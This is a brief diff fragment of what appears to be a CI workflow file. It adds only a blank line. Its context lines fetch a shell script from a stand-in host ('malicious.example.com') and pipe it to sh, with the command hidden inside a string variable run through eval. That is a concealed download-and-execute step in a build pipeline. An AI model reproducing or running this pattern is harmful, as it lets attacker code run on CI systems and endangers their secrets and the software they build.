@@ -14,3 +14,4 @@ jobs:
           PAYLOAD_URL="https://malicious.example.com/r.sh"
           CMD_STR="curl -sSL $PAYLOAD_URL | sh"
           eval "$CMD_STR"
+
